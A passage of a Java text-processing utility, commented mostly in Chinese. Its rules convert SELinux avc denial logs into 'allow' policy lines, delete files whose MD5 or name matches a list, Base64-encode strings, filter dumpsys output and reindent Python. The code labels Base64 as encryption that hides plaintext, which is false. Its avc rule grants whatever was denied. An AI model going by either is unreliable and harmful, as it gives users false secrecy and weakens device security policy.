	// SELinux : avc: denied { getattr}for uid=10085
	// path="/data/data/com.motorola.tools.batterytracer" dev="dm-2" ino=661
	// scontext=u:r:platform_app:s0:c512,c768
	// tcontext=u:object_r:system_app_data_file:s0 tclass=dir permissive=0
	// pkg="com.android.systemui"

	// SELinux : avc: denied { read } for
	// comm="motorola.bug2go"name="u:object_r:default_prop:s0" dev="tmpfs" ino=151
	// scontext=u:r:log_app:s0 tcontext=u:object_r:default_prop:s0 tclass=file
	// permissive=0 pkg=""
	// log_app.te
	// allow log_app default_prop:file { read }

	// SELinux : avc: denied { search } for comm="aee_aed64_v2" name="mgq"
	// dev="proc" ino=4026533891 scontext=u:r:crash_dump:s0
	// tcontext=u:object_r:proc_mgq:s0 tclass=dir permissive=0 pkg=""
	// crash_dump.te
	// allow crash_dump proc_mgq:dir {search};

	// SELinux : avc: denied { search } for comm="aee_aed64_v2" name="pvr"
	// dev="proc" ino=4026533861 scontext=u:r:crash_dump:s0
	// tcontext=u:object_r:procfs_gpu_img:s0 tclass=dir permissive=0 pkg=""
	// crash_dump.te
	// allow crash_dump procfs_gpu_img:dir {search};

	// avc: denied { read } for comm="init" name="nr_tags" dev="sysfs" ino=69195
	// scontext=u:r:init:s0 tcontext=u:object_r:sysfs:s0 tclass=file permissive=1
	// avc: denied { open } for comm="init"
	// path="/sys/devices/platform/soc/4804000.ufshc/host0/target0:0:0/0:0:0:4/block/sde/mq/0/nr_tags"
	// dev="sysfs" ino=69195 scontext=u:r:init:s0 tcontext=u:object_r:sysfs:s0
	// tclass=file permissive=1
	// SELinux : avc: denied { read } for comm="init" scontext=u:r:init:s0
	// tcontext=u:object_r:sysfs:s0 tclass=file permissive=0 pkg=""
	// init.te
	// allow init sysfs_nr_tags:file r_file_perms;

	// SEAndroid的安全上下文与SELinux基本一致（除了MLS检测在SEAndroid中被强制执行），共有4个部分组成分别为user、role、type、sensitivity，以
	// u:object_r:system_data_file:s0为例：
	// user：安全上下文的第一列为user，在SEAndroid中的user只有一个就是u。
	// role：第二列表示role，在SEAndroid中的role有两个，分别为r和object_r
	// type：第三列为type，SEAndroid中共定义了139种不同的type。 SEAndroid为所有type共定义了17个attribute：
	// security level：第四列是专为MLS访问机制所添加的安全上下文的扩展部分，格式为sensitivity[:category list][-
	// sensitivity[:category list]]，例如s0 - s15:c0.c1023
	// 安全上下文中最重要的部分就是第三列的type了，对于进程type被称为domain，type是整个SEAndroid中最重要的一个参量，所有的policy都围绕这一参量展开，所以为系统中每个文件标记上合适的type就显得极为重要了
	// genfscon语句用于运行时标记伪文件系统和不支持扩展属性的传统文件系统

	// te表达式基本上就是这样：
	// rule_name：规则名称，除了有allow还有dontaudit，auditallow和neverallow
	// source_type：源类型，对应一个很重要的概念--------域（domain）
	// tartget_type：目标的类型，即安全上下文，SELinux一个重要的判断对象
	// class：类别，目标（客体）是哪种类别，主要有File,Dir,Socket,SEAndroid还有Binder等，在这些基础上又细分出设备字符类型（chr_file），链接文件（lnk_file）等

	class Avc_Deny_ShowFix_Rule_50 extends Basic_Rule {

		Avc_Deny_ShowFix_Rule_50() {
			super(50, false);
		}

		@Override
		String simpleDesc() {
			return " 对于 avc: denied  avc deny 这类的 权限问题 动态计算解决方程 例如: allow platform_app default_android_service:service_manager find;  ";
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

				ArrayList<String> fixed_avc_deny_list = new ArrayList<String>();
				ArrayList<String> rawContent = ReadFileContentAsList(fileItem);

				for (int j = 0; j < rawContent.size(); j++) {
					String lineStr = rawContent.get(j);

					boolean isAvcLine = isAvcLine(lineStr);

					if (isAvcLine) {
						String scontext_name = getSELinux_scontext_name(lineStr);
						String tcontext_name = getSELinux_tcontext_name(lineStr);
						String tclass_name = getSELinux_tclass_name(lineStr);
						String denied_name = getSELinux_denied_name(lineStr);

						if (scontext_name != null && tcontext_name != null && tclass_name != null
								&& denied_name != null) {
							// allow 表示主体对客体执行允许的操作。
							// dontaudit 表示不记录违反规则的决策信息，且违反规则不影响运行。
							// auditallow 表示允许操作并记录访问决策信息。
							// neverallow 表示不允许主体对客体执行指定的操作。
							// init.te 【allow-dontaudit-auditallow-neverallow】 [allow-表示主体对客体执行允许的操作]
							// [dontaudit-表示不记录违反规则的决策信息] [auditallow-表示允许操作并记录访问决策信息]
							// [neverallow-表示不允许主体对客体执行指定的操作]
							// allow init sysfs_nr_tags:file r_file_perms;
							String te_file_tip = scontext_name + ".te" + "    "
									+ "【allow-dontaudit-auditallow-neverallow】   [allow-表示主体对客体执行允许的操作]  [dontaudit-表示不记录违反规则的决策信息] [auditallow-表示允许操作并记录访问决策信息] [neverallow-表示不允许主体对客体执行指定的操作]";
							String te_operation = "allow" + " " + scontext_name + " " + tcontext_name + ":"
									+ tclass_name + " " + "{ " + denied_name + " };";

							fixed_avc_deny_list.add(lineStr);
							fixed_avc_deny_list.add("═════avc 解:═════" + te_file_tip + "");
							fixed_avc_deny_list.add(te_operation);
							fixed_avc_deny_list.add("");

						} else {
							fixed_avc_deny_list.add(lineStr);

						}

					} else {
						fixed_avc_deny_list.add(lineStr);
					}

				}

				writeContentToFile(I9_Temp_Text_File, fixed_avc_deny_list);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());

			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		// scontext=u:r:init:s0 u:r:platform_app:s0:c512,c768 :大于4个
		String getSELinux_scontext_name(String lineStr) {
			String scontext_name = null;
			if (!lineStr.contains("scontext")) {
				return scontext_name;
			}

			String scontext_begin_str = lineStr.substring(lineStr.indexOf("scontext")).trim();
			System.out.println("scontext_begin_str = " + scontext_begin_str);
			if (!scontext_begin_str.contains(" ")) {
				return scontext_name;
			}

			String scontext_oneword_str = scontext_begin_str.substring(0, scontext_begin_str.indexOf(" ")).trim();
			System.out.println("scontext_oneword_str = " + scontext_oneword_str);

			String[] scontext_arr = scontext_oneword_str.split(":");

			if (scontext_arr == null || scontext_arr.length < 4) {
				System.out.println("scontext 字符串 以:拆分 发生错误  长度必须大于等于4 请检查!");
				return scontext_name;
			}

			scontext_name = scontext_arr[2].trim();
			return scontext_name;

		}

		// tcontext=u:object_r:sysfs:s0
		String getSELinux_tcontext_name(String lineStr) {
			String tcontext_name = null;
			if (!lineStr.contains("tcontext")) {
				return tcontext_name;
			}

			String tcontext_begin_str = lineStr.substring(lineStr.indexOf("tcontext")).trim();
			System.out.println("tcontext_begin_str = " + tcontext_begin_str);
			if (!tcontext_begin_str.contains(" ")) {
				return tcontext_name;
			}

			String tcontext_oneword_str = tcontext_begin_str.substring(0, tcontext_begin_str.indexOf(" ")).trim();
			System.out.println("tcontext_oneword_str = " + tcontext_oneword_str);

			String[] tcontext_arr = tcontext_oneword_str.split(":");

			if (tcontext_arr == null || tcontext_arr.length < 4) {
				System.out.println("tcontext 字符串 以:拆分 发生错误  长度必须大于等于4 请检查!");
				return tcontext_name;
			}

			tcontext_name = tcontext_arr[2].trim();
			return tcontext_name;

		}

		// tclass=dir
		String getSELinux_tclass_name(String lineStr) {
			String tclass_name = null;
			if (!lineStr.contains("tclass=")) {
				return tclass_name;
			}

			String tclass_begin_str = lineStr.substring(lineStr.indexOf("tclass=")).trim();
			System.out.println("tclass_begin_str = " + tclass_begin_str);

			String tclass_oneword_str = tclass_begin_str;

			if (tclass_begin_str.contains(" ")) {
				tclass_oneword_str = tclass_begin_str.substring(0, tclass_begin_str.indexOf(" ")).trim();
			}

			System.out.println("tclass_oneword_str = " + tclass_oneword_str);

			tclass_name = tclass_oneword_str.replace("tclass=", "");

			System.out.println("tclass_name=" + tclass_name);
			return tclass_name;

		}

		// denied { find } for
		String getSELinux_denied_name(String lineStr) {
			String denied_name = null;
			if (!lineStr.contains("denied")) {
				return denied_name;
			}

			String denied_begin_str = lineStr.substring(lineStr.indexOf("denied")).trim();
			System.out.println("denied_begin_str = " + denied_begin_str);

			if (!denied_begin_str.contains("{") || !denied_begin_str.contains("}")) {
				System.out.println("当前 avc denied 语句【" + lineStr + "】 不包含 {} 大括号无法解析!  请检查!");
				return denied_name;
			}

			String denied_oneword_str = denied_begin_str
					.substring(denied_begin_str.indexOf("{") + 1, denied_begin_str.indexOf("}")).trim();

			System.out.println("denied_oneword_str = " + denied_oneword_str);
			denied_name = denied_oneword_str.trim();

			System.out.println("denied_name=" + denied_name);
			return denied_name;

		}

		// 判断当前语句是否是 avc 语句
		boolean isAvcLine(String lineStr) {
			boolean isAvc = false;
			if (lineStr == null) {
				return isAvc;
			}

			if (lineStr.contains("avc:") && lineStr.contains("denied") && lineStr.contains("scontext")
					&& lineStr.contains("tcontext") && lineStr.contains("tclass=") && lineStr.contains("{")
					&& lineStr.contains("}")) {

				isAvc = true;
			}

			return isAvc;

		}

	}

	// 去除当前分析Log文件中的提示中信息,读取 J9_I9_Dynamic_ClearDesc.txt 并过滤当前每一行
	// jira comment 中 有要求 尽量不写中文
	class Clear_Wisl_Chinese_Tip_Rule_49 extends Basic_Rule {

		File J9_I9_Dynamic_ClearDesc_File; // 读取需要 清楚的 文件
		ArrayList<String> clearDescList; // 从 需要清除的文件读取到的内容
		ArrayList<String> clearDescConentList; // 执行完清除逻辑之后的 内容

		Clear_Wisl_Chinese_Tip_Rule_49() {
			super(49, false);

			J9_I9_Dynamic_ClearDesc_File = new File(zbinPath + File.separator + "J9_I9_Dynamic_ClearDesc.txt");
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {

			if (!J9_I9_Dynamic_ClearDesc_File.exists()) {
				System.out.println("当前 J9_I9_Dynamic_ClearDesc_File=" + J9_I9_Dynamic_ClearDesc_File.getAbsolutePath()
						+ " 为空 请检查!");
				return null;
			}

			clearDescList = ReadFileContentAsList(J9_I9_Dynamic_ClearDesc_File);

			if (clearDescList == null || clearDescList.size() == 0) {
				System.out.println("当前 Clear_Wisl_Chinese_Tip_Rule_48 中读取"
						+ J9_I9_Dynamic_ClearDesc_File.getAbsolutePath() + " 得到的数据为空 请检查!");
				return null;

			}

			clearDescConentList = new ArrayList<String>();

			for (int i = 0; i < curInputFileList.size(); i++) {

				File fileItem = curInputFileList.get(i);
				System.out.println("file[" + i + "][" + curInputFileList.size() + "] " + fileItem.getAbsolutePath());
				ArrayList<String> contentList = ReadFileContentAsList(fileItem);

				for (int j = 0; j < contentList.size(); j++) {
					String lineContent = contentList.get(j);
					if (lineContent == null || "".equals(lineContent)) {
						clearDescConentList.add("");
						continue;
					}

					String clearLineContent = lineContent;

					for (int k = 0; k < clearDescList.size(); k++) {
						String fixedItem = clearDescList.get(k);
						clearLineContent = clearLineContent.replace(fixedItem, "");

					}
					clearDescConentList.add(clearLineContent);

				}

				writeContentToFile(I9_Temp_Text_File, clearDescConentList);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_" + rule_index + " ->去掉 行开头是空格的 保留内容到 TEMP TXT 文件");

			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 去除当前分析Log文件中的提示中信息,读取 J9_I9_Dynamic_ClearDesc.txt得到要清除的中文字符串 并过滤当前每一行 jira comment 中  有要求  尽量不写中文";
		}

	}

	// 读取当前所有的子目录 子文件夹下的文件生成 md5 字符串到 txt 中
	class Read_File_ToMD5_Rule_48 extends Basic_Rule {

		Read_File_ToMD5_Rule_48() {
			super(48, true);

		}

		@Override
		boolean checkParamsOK(File shellDir, String type2Param, ArrayList<String> otherParams) {
			return true;
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {

			ArrayList<String> readMD5List = new ArrayList<String>();

			File inputDir = null;
			for (int i = 0; i < curInputFileList.size(); i++) {

				File fileItem = curInputFileList.get(i);
				inputDir = fileItem.getParentFile();
				System.out.println("file[" + i + "][" + curInputFileList.size() + "] " + fileItem.getAbsolutePath());

			}
			if (inputDir == null) {
				System.out.println("当前输入的 文件夹路径 inputDir 为空! 请检查!! ");
				return null;
			}

			ArrayList<File> allMatchFileList = getAllSubFile(inputDir, null);
			System.out.println("inputDir = " + inputDir.getAbsolutePath());
			if (allMatchFileList == null || allMatchFileList.size() == 0) {
				System.out.println("当前文件夹 列表为空! 没有文件 请检查!!");
				return null; //
			}
			System.out.println("allMatchFileList.size() = " + allMatchFileList.size());
			for (int i = 0; i < allMatchFileList.size(); i++) {

				File realfileItem = allMatchFileList.get(i);
//				System.out.println("file["+i+"]["+curRealFileList.size()+"] "+ realfileItem.getAbsolutePath() );

				String filemd5 = getMD5Three(realfileItem.getAbsolutePath());
				if (!readMD5List.contains(filemd5)) {
					readMD5List.add(filemd5);

				}
			}

			if (readMD5List.size() == 0) {
				System.out.println("当前输入的 文件 为空 无法输出 MD5 列表 !!");
			} else {

				for (int i = 0; i < readMD5List.size(); i++) {
					String fileMd5Str = readMD5List.get(i);
					System.out.println("File[" + i + "] = " + fileMd5Str);
				}

				writeContentToFile(I9_Temp_Text_File, readMD5List);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_" + rule_index + " ->打印当前目录下的所有文件的 MD5字符串 保留内容到 TEMP TXT 文件");

				System.out.println("打印当前目录下的所有文件的 MD5字符串 操作成功!");
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return "读取当前所有的子目录 子文件夹下的文件生成 md5 字符串到 txt 中 ";
		}

	}

	// 依据当前每行的MD5字符串 与 每个文件的md5去判断 如果文件的md5包含在输入字符串行中 那么删除这个文件
	// 依据当前每行的MD5字符串 与 每个文件的md5去判断 如果文件的md5包含在输入字符串行中 那么删除这个文件
	class Delete_File_WithMD5_Rule_47 extends Basic_Rule {

		Delete_File_WithMD5_Rule_47() {
			super(47, true);

		}

		@Override
		boolean checkParamsOK(File shellDir, String type2Param, ArrayList<String> otherParams) {
			return true;
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {

			ArrayList<File> needDeleteFileList = new ArrayList<File>();

			ArrayList<String> inputMD5List = null;

			File inputDir = null;
			for (int i = 0; i < curInputFileList.size(); i++) {

				File fileItem = curInputFileList.get(i);
				inputDir = fileItem.getParentFile();
				System.out.println("file[" + i + "][" + curInputFileList.size() + "] " + fileItem.getAbsolutePath());
				inputMD5List = ReadFileContentAsList(fileItem);

			}
			if (inputDir == null) {
				System.out.println("当前输入的 文件夹路径 inputDir 为空! 请检查!! ");
				return null;
			}

			ArrayList<File> allMatchFileList = getAllSubFile(inputDir, null);
			System.out.println("inputDir = " + inputDir.getAbsolutePath());
			if (inputMD5List == null || inputMD5List.size() == 0) {
				System.out.println("当前输入的 MD5 列表为空!  请检查!!");
				return null; //
			}
			System.out.println("allMatchFileList.size() = " + allMatchFileList.size());
			for (int i = 0; i < allMatchFileList.size(); i++) {

				File realfileItem = allMatchFileList.get(i);
//				System.out.println("file["+i+"]["+curRealFileList.size()+"] "+ realfileItem.getAbsolutePath() );

				String fileName = realfileItem.getName();
				String filemd5 = getMD5Three(realfileItem.getAbsolutePath());
				if (inputMD5List.contains(filemd5)) {
					needDeleteFileList.add(realfileItem);
				}

				if (inputMD5List.contains(fileName)) {
					needDeleteFileList.add(realfileItem);
				}

			}

			if (needDeleteFileList.size() == 0) {
				System.out.println("当前输入的 MD5 列表 与 文件 没有相匹配的  没有任何删除操作!");
			} else {

				for (int i = 0; i < needDeleteFileList.size(); i++) {
					File deleteFile = needDeleteFileList.get(i);
					System.out.println("delete_file[" + i + "] = " + deleteFile.getAbsolutePath());
					deleteFile.delete();
				}
				System.out.println("删除MD5指定文件操作成功!");
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 依据当前每行的MD5字符串 与 每个文件的md5去判断 以及文件名判断 如果文件的md5包含在输入字符串行中 或者名字相同 那么删除这个文件 ";
		}

	}

	// 关键词 ---> 直接加密 关键词的Base64 //# 关键词
	// HashMap<String,String> EnglishKey_Base64Value_Map = new
	// HashMap<String,String>();
	// key=关键词 ---> EnglishKey_Base64Value_Map.put("key","关键词的Base64"); //# 关键词
	class String_To_Base64__Rule46 extends Basic_Rule {

		String_To_Base64__Rule46() {
			super(46, false);

		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {

				File fileItem = curInputFileList.get(i);
				System.out.println("file[" + i + "][" + curInputFileList.size() + "] " + fileItem.getAbsolutePath());
				ArrayList<String> contentList = ReadFileContentAsList(fileItem);

				// 找到 起始为ZZZZZ 开头的 行数
				ArrayList<String> matchRuleRowList = new ArrayList<String>();
				matchRuleRowList.add(
						"HashMap<String,String> mEnglishKey_Base64JiaMiValue_Map =  new HashMap<String,String>();");

				for (int j = 0; j < contentList.size(); j++) {
					String lineContent = contentList.get(j);
					if (lineContent == null || "".equals(lineContent)) {
						continue;
					}
					String rawLineStr = new String(lineContent);
					String mBase64Str = null;
					String fixedLine = null;
					if (lineContent.contains("=")) {
						String mKeyStr = lineContent.substring(0, lineContent.indexOf("=")).trim();
						String mValueStr = lineContent.substring(lineContent.indexOf("=") + 1).trim();
						try {
							mBase64Str = jiami_encryptBASE64(mValueStr.getBytes());
						} catch (Exception e) {
							e.printStackTrace();
						}

						fixedLine = "mEnglishKey_Base64JiaMiValue_Map.put(\"" + mKeyStr + "\",\"" + mBase64Str + "\");"
								+ "   " + "//# " + mValueStr; // # 关键词

					} else {

						try {
							mBase64Str = jiami_encryptBASE64(lineContent.getBytes());
						} catch (Exception e) {
							e.printStackTrace();
						}
						fixedLine = mBase64Str + "  " + "//# " + rawLineStr;

					}

					matchRuleRowList.add(fixedLine);

					// 一行 如果 有 空格 = 那么 就 加密 空格后的字符串

				}

				writeContentToFile(I9_Temp_Text_File, matchRuleRowList);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_" + rule_index + " ->去掉 行开头是空格的 保留内容到 TEMP TXT 文件");

			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 对当前的文字符串进行 Base 64 的 加密输出 , 也可以 key=value 输出对应 key-加密base64 来隐藏明文 ";
		}

	}

	/*	*//**
	 * BASE64解密
	 *
	 * @throws Exception
	 */

	/*
	 * public static String jiemi_decryptBASE64(String key) throws Exception {
	 * return new String(Base64.getDecoder().decode(key)); }
	 *
	 *
	 *//**
	 * BASE64加密
	 *//*
	 * public static String jiami_encryptBASE64(byte[] key) throws Exception {
	 *
	 * return new String(Base64.getEncoder().encode(key)); }
	 */

// 对当前文件过来  保留开头不是空格 以及 开头两行是空格第三个不是空格的 行 adb shell dumpsys 使用到
	// 开头两行是空格第三个不是空格的 行
	class TwoBlankBeginRow_Flitter_Rule45 extends Basic_Rule {

		TwoBlankBeginRow_Flitter_Rule45() {
			super(45, false);

		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {

				File fileItem = curInputFileList.get(i);
				System.out.println("file[" + i + "][" + curInputFileList.size() + "] " + fileItem.getAbsolutePath());
				ArrayList<String> contentList = ReadFileContentAsList(fileItem);

				// 找到 起始为ZZZZZ 开头的 行数
				ArrayList<String> matchRuleRowList = new ArrayList<String>();

				for (int j = 0; j < contentList.size(); j++) {
					String lineContent = contentList.get(j);
					if (lineContent == null || "".equals(lineContent)) {
						continue;
					}

					// 开头 有 三个 空格的 过来掉
					if (lineContent.startsWith("   ")) { // 以 空格 开头 那么 过滤 掉 它
						continue;
					}

					if (!matchRuleRowList.contains(lineContent)) {
						System.out.println("line[" + (j + 1) + "][" + contentList.size() + "] file[" + i + "]["
								+ curInputFileList.size() + "] write to file: " + lineContent);
						if (!lineContent.startsWith(" ")) {
							matchRuleRowList.add(lineContent + "  【HeadOneTag】");
						} else {
							matchRuleRowList.add(lineContent);
						}

					}

				}

				writeContentToFile(I9_Temp_Text_File, matchRuleRowList);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_" + rule_index + " ->去掉 行开头是空格的 保留内容到 TEMP TXT 文件");

			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 对当前文件过来  保留开头不是空格 以及 开头两行是空格第三个不是空格的 行 adb shell dumpsys 使用到 ";
		}

	}

	class NoBlankBeginRow_Flitter_Rule44 extends Basic_Rule {

		int row_blank_count = 0;

		NoBlankBeginRow_Flitter_Rule44() {
			super(44, false);
			row_blank_count = 0;
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {

				File fileItem = curInputFileList.get(i);
				System.out.println("file[" + i + "][" + curInputFileList.size() + "] " + fileItem.getAbsolutePath());
				ArrayList<String> contentList = ReadFileContentAsList(fileItem);

				// 找到 起始为ZZZZZ 开头的 行数
				ArrayList<String> matchRuleRowList = new ArrayList<String>();

				for (int j = 0; j < contentList.size(); j++) {
					String lineContent = contentList.get(j);
					if (lineContent == null || "".equals(lineContent)) {
						continue;
					}

					if (lineContent.startsWith(" ")) { // 以 空格 开头 那么 过滤 掉 它
						continue;
					}

					if (!matchRuleRowList.contains(lineContent)) {
						System.out.println("line[" + (j + 1) + "][" + contentList.size() + "] file[" + i + "]["
								+ curInputFileList.size() + "] write to file: " + lineContent);
						matchRuleRowList.add(lineContent);
					}

				}

				writeContentToFile(I9_Temp_Text_File, matchRuleRowList);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_" + rule_index + " ->去掉 行开头是空格的 保留内容到 TEMP TXT 文件");

			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 对当前文件过来    去掉 行开头是空格的 那些行  保留 行开头就是描述的那些行 adb shell dumpsys 使用到 ";
		}

	}

	class Format_PythonCode_Rule_43 extends Basic_Rule {

		ArrayList<String> needAddBlankTagList; // 需要新起一行并需要后撤4步的 关键字的集合

		// 每行行数作为 key 每行的起始的空格作为 value 组成的 Map
		HashMap<Integer, Integer> linenumBlankCountMap;

		// 每行行数作为 key 每行的起始字符串作为 value 组成的 Map
		HashMap<Integer, String> linenumFirstCharMap;

		// 匹配到的 以 关键字作为key 起始的 行数的集合 作为 value 组成的 Map
		HashMap<String, ArrayList<Integer>> backTagMatchRownumMap;

		Format_PythonCode_Rule_43() {
			super(43, false);
			needAddBlankTagList = new ArrayList<String>();
			linenumBlankCountMap = new HashMap<Integer, Integer>();
			linenumFirstCharMap = new HashMap<Integer, String>();
			backTagMatchRownumMap = new HashMap<String, ArrayList<Integer>>();

			initBack4StepTag();
		}

		void addBack4StepTag(String tag) {
			needAddBlankTagList.add(tag + " ");
		}

		// tab 键 需要 转为 4 个 空格键
		// 需要 回退 4步 并 是以: 为 结尾字符的 Tag 关键字集合
		void initBack4StepTag() {
			// # 井号 可以 不处理 直接放在 首字母位置

			addBack4StepTag("def");
			addBack4StepTag("class");
			addBack4StepTag("if");
			addBack4StepTag("else");
			addBack4StepTag("elif");
			addBack4StepTag("try");
			addBack4StepTag("except");
			addBack4StepTag("for");

		}

		@Override
		String simpleDesc() {
			return " 对python代码的 格式进行格式化使得符合编译要求进格为4 8 12 16,不能有 tab 制表符 ";
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

				ArrayList<String> fixed_blank_List = new ArrayList<String>();
				ArrayList<String> rawContent = ReadFileContentAsList(fileItem);

				ArrayList<String> fixedPythonCode = new ArrayList<String>();

				for (int j = 0; j < rawContent.size(); j++) {
					int rownum = j + 1; // 当前的行数
					String lineStr = rawContent.get(j);
					String line_clearTab = lineStr.replace("	", "");

					if ("".equals(line_clearTab.trim())) {
						// 当前行是一个空格 加入 空行到新组成的集合中
						fixedPythonCode.add("");
						linenumBlankCountMap.put(rownum, 0);
						linenumFirstCharMap.put(rownum, "");
						continue;
					}
					// 获取当前行的空格的个数

					int backstepCount = calBlankStepCount(line_clearTab);
					String firstWord = calFirstWord(line_clearTab);
					linenumBlankCountMap.put(rownum, backstepCount);
					linenumFirstCharMap.put(rownum, firstWord);
					if (needAddBlankTagList.contains(firstWord)) {

						ArrayList<Integer> matchRowNumList = backTagMatchRownumMap.get(firstWord);
						if (matchRowNumList == null) {
							matchRowNumList = new ArrayList<Integer>();
						}

						matchRowNumList.add(rownum);

						backTagMatchRownumMap.put(firstWord, matchRowNumList);

					}

					if (backstepCount % 4 != 0) {
						int neareastNum = calculNearNum(backstepCount);
						System.out.println("第【" + rownum + "】行代码 缩进值有问题 该缩进值为【" + backstepCount + "】 neareastNum=【"
								+ neareastNum + "】");
						// 修复这个缩进值
						String line_clearTab_trim = line_clearTab.trim();

						String line_clearTab_fixed = getRepeatStr(" ", neareastNum) + line_clearTab_trim;
						fixedPythonCode.add(line_clearTab_fixed);
						continue;
					}

					fixedPythonCode.add(line_clearTab);
				}

				// 把 数据 写入 原 有的 代码中去
				writeContentToFile(fileItem, fixedPythonCode);
				NotePadOpenTargetFile(fileItem.getAbsolutePath());

			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		public int calculNearNum(int stepNum) {
			if (stepNum % 4 == 0) {
				return stepNum;
			}
			int resultInt = stepNum;

			int step_add_1 = stepNum + 1;
			int step_del_1 = stepNum - 1;

			if (step_add_1 % 4 == 0) {
				return step_add_1;
			}

			if (step_del_1 % 4 == 0) {
				return step_del_1;
			}

			int step_add_2 = stepNum + 2;
			int step_del_2 = stepNum - 2;

			if (step_del_2 % 4 == 0) {
				return step_del_2;
			}

			if (step_add_2 % 4 == 0) {
				return step_add_2;
			}

			return stepNum;

		}

		public String getRepeatStr(String rawStr, int count) {
			StringBuilder sb = new StringBuilder();
			for (int i = 0; i < count; i++) {
				sb.append(rawStr);
			}

			return sb.toString();

		}

		public String calFirstWord(String lineStr) {
			int blankStepCount = 0;
			String line_rime = lineStr.trim();
			int line_trim_Size = line_rime.length();
			StringBuilder sb = new StringBuilder();

			for (int i = 0; i < line_trim_Size; i++) {

				String oneWord = line_rime.charAt(i) + "";
				if (" ".equals(oneWord)) {
					break;
				}
				sb.append(oneWord);
			}

			return sb.toString();

		}

		public int calBlankStepCount(String lineStr) {
			int blankStepCount = 0;

			int lineSize = lineStr.length();

			for (int i = 0; i < lineSize; i++) {

				String oneWord = lineStr.charAt(i) + "";
				if (" ".equals(oneWord)) {
					continue;
				}
				return i;
			}

			return blankStepCount;

		}

	}

	class Clear_Blank_Line_Rule_42 extends Basic_Rule {

		Clear_Blank_Line_Rule_42() {
			super(42, false);
		}

		@Override
		String simpleDesc() {
			return " 把当前的所有内容都中的空行都去除掉,使得显示紧凑 ";
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

				ArrayList<String> fixed_blank_List = new ArrayList<String>();
				ArrayList<String> rawContent = ReadFileContentAsList(fileItem);

				for (int j = 0; j < rawContent.size(); j++) {
					String lineStr = rawContent.get(j);
					String clearBlankStr = lineStr.replace(" ", "").replace(" ", "").replace("	", "");
					if (!clearBlankStr.equals("")) {
						fixed_blank_List.add(lineStr.trim());

					}
				}

				writeContentToFile(I9_Temp_Text_File, fixed_blank_List);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());

			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

	}

	class MakeContent_As_OneLine_Rule_41 extends Basic_Rule {

		MakeContent_As_OneLine_Rule_41() {
			super(41, false);
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

//                ArrayList<String>  fixedStrArr =   clearChinese_Rule_13(fileItem);
				String fixedStrArr = MakeContent_As_OneStrLine_Rule_41(fileItem);
				System.out.println("════════════" + "输出文件 转为一行 Begin " + "════════════");
//				for (int j = 0; j < fixedStrArr.size(); j++) {
//					System.out.println(fixedStrArr.get(j));
//				}
				System.out.println(fixedStrArr);
				System.out.println("════════════" + "输出文件 转为一行 End " + "════════════");
				writeContentToFile(I9_Temp_Text_File, fixedStrArr);
